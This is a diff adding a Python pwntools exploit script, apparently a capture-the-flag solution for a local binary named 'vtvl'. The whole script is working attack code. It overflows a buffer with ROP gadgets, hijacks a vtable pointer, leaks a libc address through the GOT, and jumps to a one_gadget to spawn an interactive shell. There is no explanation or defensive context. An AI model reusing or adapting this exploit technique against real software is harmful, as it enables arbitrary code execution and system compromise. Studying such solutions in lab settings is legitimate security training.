@@ -1,0 +1,116 @@
+#!/usr/bin/env python
+#  -*-coding:utf-8-*-
+from pwn import *
+import time
+import os
+
+#lambs:
+wait = lambda x: raw_input(x)
+
+#context.log_level='debug'
+
+
+pop_rsp=0x401333
+
+p_ret =0x401293
+pp_ret=0x401331
+
+addesp_8 = 0x400986
+addesp_24 = 0x401441
+addesp_28 = 0x40138d
+addesp_36 = 0x401290
+#addesp_40 = 0x401543
+addesp_48 = 0x40166a
+
+addesp_40 = 0x40128f
+p = process('./vtvl')
+
+p.recv(2048)
+
+#payload="MMAP_THRESHOLD_=0\0"+'A'*0x3e+p64(0x401e40)+'A'*0x18+p64(0x605040)
+gadget = p64(pp_ret)+p64(p_ret)+p64(0)+p64(addesp_40)
+
+payload= gadget    #p64(0x400cee)   #0x605060   hijack
+
+payload=payload.ljust(0x28,'A')
+payload+="MALLOC_MMAP_THRESHOLD_=0" #0x605080
+
+gadget2=p64(0)+p64(addesp_24)
+
+payload+=gadget2
+
+payload=payload.ljust(0x50,'A')
+payload+=p64(0x605060)   #0x401e40  vtable
+
+gadget3=p64(0)+p64(0)+p64(addesp_24)
+
+payload+=gadget3
+
+pop_rid = 0x401551
+pop_rbx_rbp_r12_r13_r14_r15 = 0x4017CA
+magic = 0x4017B0
+
+bss = 0x605020
+
+elf = ELF('./vtvl')
+
+write_plt = elf.plt['write']
+write_got = elf.got['write']
+
+read_got = elf.got['read']
+
+pop_rbp = 0x400aa0
+
+leave = 0x400be3
+
+xor_eax = 0x4016f0
+
+rop=p64(0)*3+p64(pop_rbx_rbp_r12_r13_r14_r15)+p64(0)+p64(1)+p64(write_got)+p64(0x8)+p64(write_got)+p64(1)+p64(magic)+p64(0)+p64(0)+p64(1)+p64(read_got)+p64(0x8)+p64(bss)+p64(0)+p64(magic)+p64(0)*7+p64(xor_eax)+p64(pop_rsp)+p64(bss)
+
+payload+=rop
+
+payload=payload.ljust(0x1d8,'A')
+payload+=p64(0x605088)  #env
+
+
+
+
+
+wait('start')
+p.sendline(payload)
+#gdb.attach(p)
+wait('stack overflow')
+
+p.recv(2048)
+p.sendline(str('-1'))
+
+payload2="\x00"*0xa050+p64(0x4)+p64(0x605060)+p64(0x1)+p64(0x1)+p64(0x1)+p64(0x1)
+payload3="\x00"*0xa050+p64(0x4)+p64(0x1)+p64(0x605060)+p64(0x1)+p64(0x1)+p64(0x1)
+payload4="\x00"*0xa050+p64(0x4)+p64(0x1)+p64(0x1)+p64(0x605060)+p64(0x1)+p64(0x1)
+payload5="\x00"*0xa050+p64(0x4)+p64(0x1)+p64(0x1)+p64(0x1)+p64(0x605060)+p64(0x1)
+payload6="A"*0xa050+p64(0x4)+p64(0x1)+p64(0x1)+p64(0x1)+p64(0x1)+p64(0x605060)
+
+
+payload7="A"*0xa050+p64(0x1)+p64(0x1)+p64(0x605060)+p64(0x1)+p64(0x1)+p64(0x1)
+
+p.sendline(payload7)
+wait('hijack')
+write_addr = u64(p.recv().rjust(8,'\x00'))
+log.success("write_addr:%#x" % write_addr)
+
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+one_gadget = write_addr - libc.symbols['write'] + 0x45216
+
+log.success("one_gadget:%#x" % one_gadget)
+
+
+p.send(p64(one_gadget))
+
+wait('get shell!')
+
+
+
+
+
+p.interactive()
